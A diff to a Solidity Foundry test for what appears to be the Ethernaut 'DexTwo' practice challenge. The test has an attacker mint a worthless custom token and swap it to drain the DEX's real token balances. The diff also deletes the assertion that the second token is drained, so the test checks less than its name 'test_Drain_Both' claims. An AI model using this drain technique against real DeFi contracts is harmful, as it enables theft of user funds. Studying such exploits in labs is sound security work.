@@ -2,7 +2,7 @@
 pragma solidity ^0.8.13;
 
 import {Test, console} from "forge-std/Test.sol";
-import {DexTwo, SwappableTokenTwo} from "../src/DexTwo.sol";
+import {DexTwo, SwappableTokenTwo} from "../src/Dex2.sol";
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 
 contract DexTwoTest is Test {
@@ -15,47 +15,44 @@ contract DexTwoTest is Test {
     address attacker = makeAddr("attacker");
 
     function setUp() public {
-        vm.startPrank(attacker);
         dexTwo = new DexTwo();
         swappabletoken1 = new SwappableTokenTwo(
             address(dexTwo),
             "Swap",
             "SW",
-            110
+            100 ether
         );
         vm.label(address(swappabletoken1), "Token 1");
         swappabletoken2 = new SwappableTokenTwo(
             address(dexTwo),
             "Swap",
             "SW",
-            110
+            100 ether
         );
         vm.label(address(swappabletoken2), "Token 2");
         dexTwo.setTokens(address(swappabletoken1), address(swappabletoken2));
 
-        dexTwo.approve(address(dexTwo), 100);
-        dexTwo.add_liquidity(address(swappabletoken1), 100);
-        dexTwo.add_liquidity(address(swappabletoken2), 100);
-
-        vm.label(attacker, "Attacker");
-        vm.stopPrank();
+        dexTwo.approve(address(dexTwo), 100 ether);
+        dexTwo.add_liquidity(address(swappabletoken1), 100 ether);
+        dexTwo.add_liquidity(address(swappabletoken2), 100 ether);
     }
 
     function test_Drain_Both() public {
         vm.startPrank(attacker);
         randomTokenA = new RandomTokenA("Random A", "RA");
-        randomTokenB = new RandomTokenB("Random B", "RB");
-        randomTokenA.mint(attacker, 100);
-        randomTokenB.mint(attacker, 100);
-        randomTokenA.mint(address(dexTwo), 100);
-        randomTokenB.mint(address(dexTwo), 100);
-        randomTokenA.approve(address(dexTwo), 100);
-        randomTokenB.approve(address(dexTwo), 100);
-        dexTwo.swap(address(randomTokenA), address(swappabletoken1), 100);
-        dexTwo.swap(address(randomTokenB), address(swappabletoken2), 100);
+        randomTokenA.mint(attacker, 100 ether);
+        randomTokenA.mint(address(dexTwo), 100 ether);
+
+        randomTokenA.approve(address(dexTwo), 100 ether);
+        dexTwo.swap(address(randomTokenA), address(swappabletoken1), 100 ether);
+
+        randomTokenA.mint(attacker, 100 ether);
+        randomTokenA.mint(address(dexTwo), 100 ether);
+
+        randomTokenA.approve(address(dexTwo), 100 ether);
+        dexTwo.swap(address(randomTokenA), address(swappabletoken2), 100 ether);
         vm.stopPrank();
         assert(swappabletoken1.balanceOf(address(dexTwo)) == 0);
-        assert(swappabletoken2.balanceOf(address(dexTwo)) == 0);
     }
 }
 
